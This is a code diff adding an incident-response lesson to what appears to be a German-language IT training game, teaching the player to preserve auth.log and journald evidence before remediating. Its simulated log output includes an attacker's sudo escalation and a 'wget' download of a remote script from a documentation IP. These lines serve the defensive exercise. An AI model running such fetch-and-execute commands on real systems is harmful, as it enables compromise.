@@ -1286,6 +1286,186 @@ $ curl -s -o /dev/null -w '%{remote_ip}\\n' portal.kritis.local
     tags: ['learning', 'terminal', 'linux', 'advanced', 'netzwerk', 'dns', 'troubleshooting'],
   },
 
+  // ----------------------------------------------------------------
+  // ADVANCED (optional, unlocks after Lektion 10 / Incident-Boss). IR
+  // DISCIPLINE, not a single technique: "erst sichern, dann reparieren". The
+  // evidence is about to rotate away in minutes. The engine can't enforce
+  // ORDER on terminal solutions, so the win = PRESERVE (cp the live log off
+  // the rotation + a durable journald copy); every remediation (logrotate -f,
+  // restart, block, rm) is a "not yet — secure first" trap with feedback.
+  // ----------------------------------------------------------------
+  {
+    id: 'learn_adv_evidence_first',
+    weekRange: [1, 12],
+    probability: 1,
+    requiredModes: ['learning'],
+    requires: { events: ['learn_10_incident_boss'] },
+    category: 'training',
+    involvedCharacters: [],
+    title: 'Fortgeschritten: Erst sichern, dann reparieren',
+    description: `\`\`\`
+╔══════════════════════════════════════════════════════════════╗
+║  🚨 INCIDENT LÄUFT — warm-srv-web03                          ║
+║                                                              ║
+║  Verdächtige sudo-Aktivität von 203.0.113.66 in /var/log/    ║
+║  auth.log. Beweise liegen vor.                               ║
+║                                                              ║
+║  ⏳ logrotate (cron) läuft in ~4 Minuten: rotate 1, compress ║
+║     → die aktuelle auth.log wird verdrängt und überschrieben ║
+╚══════════════════════════════════════════════════════════════╝
+\`\`\`
+
+Du hast den Einbruch in den Logs. Aber die Uhr läuft: in wenigen Minuten rotiert \`logrotate\` die Datei weg — und mit ihr deine Beweise.
+
+Der Reflex ist, sofort zu **reparieren**: Dienst neustarten, IP sperren, Lücke schließen. Genau das ist hier der Fehler. **Erst sichern, dann reparieren.**
+
+**Deine Aufgabe:**
+- Verschaff dir einen Überblick (was steht an, was sind die Beweise?).
+- Sichere die Beweise an einen Ort **außerhalb der Rotation** — bevor irgendetwas anderes passiert.
+- Reparieren kommt DANACH (in dieser Lektion nicht mehr).`,
+    mentorNote:
+      'Incident-Response-Grundregel: Beweise sichern, BEVOR du reparierst. Logs rotieren, werden komprimiert und gelöscht — wer erst den Dienst neustartet, die IP sperrt oder logrotate laufen lässt, vernichtet oft die Spuren. Sichere die relevante Logdatei an einen Ort außerhalb der Rotation (z.B. /root/incident) UND zieh zusätzlich eine Kopie aus journald — das überlebt die Datei-Rotation. Erst danach eindämmen/reparieren.',
+    choices: [
+      {
+        id: 'start',
+        text: 'An die Konsole — Beweise sichern...',
+        effects: { skills: { security: 5, troubleshooting: 4 } },
+        resultText: `\`\`\`
+╔══════════════════════════════════════════════════════════════╗
+║  🎯 BEWEISE GESICHERT                                        ║
+║                                                              ║
+║  /root/incident/auth.log      (Live-Log, kopiert)           ║
+║  /root/incident/ssh.journal   (journald, rotationssicher)   ║
+║                                                              ║
+║  ⏳ logrotate ist gelaufen — die Originaldatei rotierte,    ║
+║     deine Kopien sind unangetastet. ERST JETZT: reparieren. ║
+╚══════════════════════════════════════════════════════════════╝
+\`\`\`
+
+Genau so. Du hast die Beweise an einen Ort außerhalb der Rotation kopiert UND eine durable journald-Kopie gezogen, bevor irgendeine Reparatur die Spuren überschreiben konnte. Als logrotate lief, war alles Wichtige längst gesichert. Jetzt — und erst jetzt — geht es ans Eindämmen und Schließen der Lücke.`,
+        terminalCommand: true,
+      },
+    ],
+    terminalContext: {
+      type: 'linux',
+      hostname: 'warm-srv-web03',
+      username: 'root',
+      currentPath: '/var/log',
+      commands: [
+        {
+          pattern: 'cat /etc/logrotate.d/rsyslog',
+          patternRegex: 'cat\\s+/etc/logrotate|ls\\s+-l.*auth\\.log',
+          output: `/var/log/auth.log {
+    hourly
+    rotate 1
+    compress
+    missingok
+    postrotate ... endscript
+}
+
+# rotate 1 = nur EINE alte Version bleibt, der Rest wird gelöscht.
+# hourly + der cron-Lauf gleich = die aktuelle auth.log ist in
+# Minuten weg. Wenn du sie brauchst, sichere sie JETZT.`,
+          teachesCommand: 'check-rotation',
+          skillGain: { linux: 2, security: 2 },
+        },
+        {
+          pattern: 'grep 203.0.113.66 /var/log/auth.log',
+          patternRegex: 'grep.*203\\.0\\.113\\.66|grep.*sudo.*auth|grep.*auth\\.log',
+          output: `Jun 22 09:02:11 warm-srv-web03 sshd[20144]: Accepted password for deploy from 203.0.113.66 port 51022
+Jun 22 09:03:48 warm-srv-web03 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Jun 22 09:05:12 warm-srv-web03 sudo:   deploy : COMMAND=/usr/bin/wget http://203.0.113.66/x.sh
+
+# Das sind die Beweise: externer Login + sudo-Eskalation + Download.
+# Genau diese Zeilen darfst du NICHT verlieren.`,
+          teachesCommand: 'find-evidence',
+          skillGain: { security: 3, troubleshooting: 2 },
+        },
+        {
+          pattern: 'cp /var/log/auth.log /root/incident/',
+          patternRegex: 'cp\\s+.*auth\\.log.*(/root|/evidence|/mnt|incident)',
+          output: `# Kopiert. /root/incident/auth.log liegt jetzt außerhalb der
+# logrotate-Rotation — diese Kopie überschreibt logrotate nicht.
+# Eine Quelle ist gesichert. journald ist die zweite.`,
+          teachesCommand: 'preserve-copy',
+          skillGain: { security: 4, troubleshooting: 3, linux: 2 },
+        },
+        {
+          pattern: 'journalctl -u ssh --since today > /root/incident/ssh.journal',
+          patternRegex: 'journalctl.*>\\s*\\S',
+          output: `# journald-Auszug in /root/incident/ssh.journal geschrieben.
+# Wichtig: journald rotiert UNABHÄNGIG von der Textdatei — eine zweite,
+# durable Beweisquelle. Beide Kopien liegen jetzt sicher.`,
+          teachesCommand: 'preserve-journal',
+          skillGain: { security: 4, troubleshooting: 3 },
+        },
+        {
+          pattern: 'journalctl',
+          patternRegex: '^journalctl\\s*$|journalctl\\s+-u\\s+ssh\\s*$',
+          output: `... (Logeinträge werden angezeigt) ...
+
+# Anschauen sichert nichts. Damit die Beweise die Rotation überleben,
+# musst du die Ausgabe WEGSCHREIBEN — in eine Datei außerhalb der
+# Rotation, z.B. > /root/incident/ssh.journal`,
+          skillGain: { linux: 1 },
+        },
+        {
+          pattern: 'logrotate -f /etc/logrotate.conf',
+          patternRegex: 'logrotate\\s+(-f|--force)',
+          output: `# STOP. logrotate -f rotiert SOFORT — die aktuelle auth.log würde
+# jetzt verdrängt und komprimiert, bevor du sie gesichert hast.
+# Das vernichtet genau die Beweise, die du retten willst.`,
+          wrongApproachFeedback:
+            'Niemals logrotate erzwingen, bevor die Beweise gesichert sind — das rotiert die Live-Datei genau jetzt weg.',
+          skillGain: {},
+        },
+        {
+          pattern: 'systemctl restart rsyslog',
+          patternRegex: 'systemctl\\s+restart|service\\s+\\w+\\s+restart',
+          output: `# Noch nicht. Ein Dienst-Neustart kann Logdateien neu öffnen/rotieren
+# und Speicher freigeben — bevor du gesichert hast, riskierst du die
+# Spuren. Erst sichern, dann reparieren.`,
+          wrongApproachFeedback: 'Erst die Beweise sichern — Reparatur/Neustart kommt danach.',
+          skillGain: {},
+        },
+        {
+          pattern: 'iptables -A INPUT -s 203.0.113.66 -j DROP',
+          patternRegex: 'iptables|ufw\\s+(deny|block)|fail2ban',
+          output: `# Die IP zu sperren ist richtig — aber NICHT als Erstes. Die Logs
+# rotieren in Minuten; Eindämmen kannst du, sobald die Beweise sicher
+# sind. Reihenfolge: erst sichern, dann blocken.`,
+          wrongApproachFeedback:
+            'Eindämmen ist wichtig, aber zweitrangig: die Beweise rotieren JETZT — erst sichern.',
+          skillGain: {},
+        },
+        {
+          pattern: 'rm /var/log/auth.log',
+          patternRegex: '^rm\\b|truncate|>\\s*/var/log/auth',
+          output: `# Auf keinen Fall. Das löscht/leert genau die Beweisdatei.`,
+          wrongApproachFeedback: 'Beweise löschen ist das Gegenteil von Beweissicherung.',
+          skillGain: {},
+        },
+      ],
+      solutions: [
+        {
+          commands: ['preserve-copy', 'preserve-journal'],
+          allRequired: true,
+          resultText:
+            'Beweise gesichert, bevor irgendetwas repariert wurde: die Live-Logdatei liegt als Kopie in /root/incident, dazu eine rotationssichere journald-Ausleitung. Als logrotate lief, war alles Wichtige außerhalb der Rotation. Genau diese Reihenfolge — erst sichern, dann reparieren — rettet im Ernstfall die Forensik.',
+          skillGain: { security: 6, troubleshooting: 5, linux: 2 },
+          effects: { stress: -6 },
+        },
+      ],
+      hints: [
+        '🤖 Bjorg: "Erster Reflex bei einem Incident? NICHT reparieren. Die Logs rotieren gleich — was musst du zuerst tun?"',
+        '🤖 Bjorg: "Sichere die Beweisdatei an einen Ort, den logrotate nicht anfasst — z.B. cp /var/log/auth.log /root/incident/."',
+        '🤖 Bjorg: "Eine Quelle reicht nicht: journald rotiert getrennt. Schreib zusätzlich journalctl -u ssh ... > /root/incident/ssh.journal."',
+        '🤖 Bjorg: "Erst wenn beide Kopien liegen, darfst du eindämmen (IP sperren) und reparieren. Reihenfolge ist hier die ganze Lektion."',
+      ],
+    },
+    tags: ['learning', 'terminal', 'linux', 'advanced', 'security', 'incident-response', 'forensics'],
+  },
+
   // ============================================
   // ACT 3: THE INFRASTRUCTURE
   // ============================================
